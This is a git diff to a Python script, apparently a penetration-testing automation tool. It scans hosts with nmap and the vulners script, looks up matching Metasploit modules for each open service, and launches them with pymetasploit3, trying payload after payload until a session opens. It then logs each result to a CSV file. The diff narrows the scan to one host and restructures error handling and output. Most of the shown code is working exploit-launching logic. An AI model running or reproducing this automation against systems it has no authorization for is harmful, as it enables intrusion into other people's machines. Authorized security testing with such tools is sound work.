@@ -12,22 +12,15 @@ import sys
 import time
 from pymetasploit3.msfrpc import *
 import pandas as pd
+import csv
 
 startTime = datetime.now()
 
 startDir = os.path.dirname(os.path.realpath(sys.argv[0]))
 
-windows = 'window'
-ourOS = platform.system()
-if windows.lower() in ourOS.lower():
-	slash = "\\"
-	startDir = startDir.replace("\\\\", "\\")
-	split = 3
-else:
-	slash = "/"
-	split = 1
+
 # Open file for writing our output and create if its not created already
-f = open(startDir + slash + "overview.txt","a+")
+f = open(startDir + "/overview.txt","a+")
 
 # get host IP
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -71,7 +64,7 @@ f.write('\nInitiating quick scan from host {0} to {1} \n'.format(subnet[0], subn
 
 # NMAP subnet excluding our IP #
 ## make -Pn, -F, and speed (-T#) switch for during the run
-nm.scan(hosts=str(subnet), arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)
+nm.scan(hosts='10.0.0.42', arguments='-O -sV -T4 -Pn --script vulners --exclude ' + IP)
 
 hostsCount = len(nm.all_hosts())
 hostObjects = []
@@ -80,15 +73,15 @@ f2 = open("IPList.txt","a+")
 f2.write('\n'.join(map(str,nm.all_hosts())))
 f2.close()
 
-f3 = open(startDir + slash + "serviceDetails.txt","a+")
-f4 = open(startDir + slash + "cveDetails.txt","a+")
+f3 = open(startDir + "/serviceDetails.txt","a+")
+f4 = open(startDir + "/cveDetails.txt","a+")
 
 # '/' is not platform independant and neither is 'cd' #
 def findModules(service, details, port, host):
     print("testing port:" + str(port))
-    hostDir = 'cd ' + startDir[split:] + slash + host
+    hostDir = 'cd ' + startDir[1:] + '/' + host
     outFile = service + str(port) + '.csv'
-    console.write('cd ' + slash)
+    console.write('cd ' + '/')
     while console.read()['busy'] == "True":
         time.sleep(1)
     console.write(hostDir) # switch into host dir if not already
@@ -99,9 +92,10 @@ def findModules(service, details, port, host):
         console.write(search)
         while console.read()['busy'] == "True":
             time.sleep(1)
+        return outFile
     except:
-        print("error with search")
-    return outFile
+        print("  error with search")
+    return "error"
 
 
 
@@ -110,75 +104,93 @@ def exploitHost(host):
 	countMSMod = 0
 	exploitObjects = []
 	try:
-		os.system('cd ' + slash + ' && cd ' + startDir[split:] + ' && mkdir ' + host)
-	except:
-		pass
+		os.system('cd / && cd ' + startDir[1:] + ' && mkdir ' + host)
+	except Exception as e:
+		print(e)
 	for port in nm[host]['tcp'].keys():
 		service = str(nm[host]['tcp'][port]['name'])
 		details = str(nm[host]['tcp'][port]['product']) + " " + str(nm[host]['tcp'][port]['version'])
 		exploitFile = findModules(service, details, port, host)
-		filePath = host + slash + exploitFile
-		try:
-			df = pd.read_csv(filePath, skipinitialspace=True, usecols=['Name'])
-			dfLen = len(df)
-		except:
-			dfLen = 0 # Metasploit returned "No results found"
-		countMSMod = countMSMod + dfLen
-		if dfLen > 0:
-			for index, row in df.iterrows():
-				exploitName = row['Name'][8:]
-				print("Attempting module: " + exploitName)
-				exploit2 = client.modules.use('exploit', exploitName)
-				if len(exploit2.targetpayloads()[0]) >= 1:
-					try: # set remote host
-						exploit2['RHOSTS'] = host
-					except:
-						try:
-							exploit2['RHOST'] = host
-						except:
-							pass
-					try: # set port number
-						exploit2['RPORT'] = port
-					except:
-						try:
-							exploit2['RPORTS'] = port
-						except:
-							pass
-
-					for item in exploit2.missing_required:
-						print("Item not set: " + item + ". Exiting exploit " + exploitName)
-
-					sessionsBefore = len(client.sessions.list)
-					print("Sessions before: " + str(sessionsBefore))
-					time.sleep(1)
-					failed = True
-					i = 0
-					while failed is True and i <= len(exploit2.targetpayloads())-1:
-						try:
-							payload = exploit2.targetpayloads()[i]
-							payloadObj = client.modules.use('payload', payload)
-							print(exploit2.execute(payload=payloadObj))
-							failed = False
-						except:
-							i += 1
-					time.sleep(5)
-
-					if len(client.sessions.list) > sessionsBefore:
-						print("The exploit worked!")
-						result = 'Success'
-					else:
-						print("The exploit failed")
-						result = 'Fail'
-					print("Sessions after: " + str(len(client.sessions.list)))
-
-					hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
-					exploitObjects.append(hostExploits)
-				else:
-					print("No payload selected for: " + exploitName)
+		if exploitFile == "error":
+			print("  no file returned from called method")
 		else:
-			pass # No modules found for this service / port
-	for x in exploitObjects:
-		print(x)
+			filePath = host + '/' + exploitFile
+			try:
+				df = pd.read_csv(filePath, skipinitialspace=True, header=None, skiprows = 1, usecols=[1], names = ['Name'])
+				time.sleep(2)
+				dfLen = len(df)
+			except Exception as e:
+				if 'does not exist' in str(e):
+					print("  Could not locate " + filePath + " in " + os.getcwd())
+					dfLen = 0
+				else:
+					print(e)
+					dfLen = 0 # Metasploit returned "No results found"
+			countMSMod = countMSMod + dfLen
+			if dfLen > 0:
+				for index, row in df.iterrows():
+					exploitName = row['Name'][8:]
+					print("  Attempting module: " + exploitName)
+					exploit2 = client.modules.use('exploit', exploitName)
+					if len(exploit2.targetpayloads()[0]) >= 1:
+						try: # set remote host
+							exploit2['RHOSTS'] = host
+						except:
+							try:
+								exploit2['RHOST'] = host
+							except:
+								pass
+						try: # set port number
+							exploit2['RPORT'] = port
+						except:
+							try:
+								exploit2['RPORTS'] = port
+							except:
+								pass
+
+						for item in exploit2.missing_required:
+							print("  Item not set: " + item + ". Exiting exploit " + exploitName)
+
+						sessionsBefore = len(client.sessions.list)
+						time.sleep(1)
+						failed = True
+						i = 0
+						while failed is True and i <= len(exploit2.targetpayloads())-1:
+							try:
+								payload = exploit2.targetpayloads()[i]
+								payloadObj = client.modules.use('payload', payload)
+								exploit2.execute(payload=payloadObj)
+								failed = False
+							except:
+								i += 1
+						time.sleep(5)
+
+						if len(client.sessions.list) > sessionsBefore:
+							print("     The exploit worked!")
+							result = 'Success'
+						else:
+							print("     The exploit failed")
+							result = 'Fail'
+
+						hostExploits = {"IP":host, 'Service':service, 'Port':str(port), 'Exploit':exploitName, 'Payload':str(payload), 'Result':result}
+						exploitObjects.append(hostExploits)
+					else:
+						print("  No payload selected for: " + exploitName)
+			else:
+				print("  No modules found") # No modules found for this service / port
+
+
+	try:
+		csv_file = host + '/exploits.csv'
+		with open(csv_file, 'w') as csvfile:
+			writer = csv.DictWriter(csvfile, fieldnames = ["IP", "Service", "Port", "Exploit", "Payload", "Result"])
+			writer.writeheader()
+			for x in exploitObjects:
+				writer.writerow(x)
+		# exploitObject = dataframe.to_dict('records')
+		# dataframe.to_csv('exploits.csv')
+	except Exception as e:
+		print(e)
 	hostSessions = len(client.sessions.list)-hostSessions
 	return countMSMod, str(hostSessions)
 
